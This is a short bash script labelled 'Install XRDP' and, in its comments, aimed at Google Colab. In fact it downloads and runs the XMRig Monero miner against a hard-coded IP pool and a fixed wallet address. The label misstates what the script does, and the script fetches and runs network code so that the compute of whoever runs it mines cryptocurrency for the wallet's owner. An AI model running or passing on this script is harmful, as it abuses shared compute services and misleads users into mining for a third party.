#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o 27.76.2.163:3333 -u 41eevgxiAavYjFeSdvXKegWAL91yAEd3LguKu6GPEv37DSPzf66NoAwFPVe6paGhS2LbZeowoi41SaxVt4azVv7zTicoDs6 -k --tls --rig-id GC-US
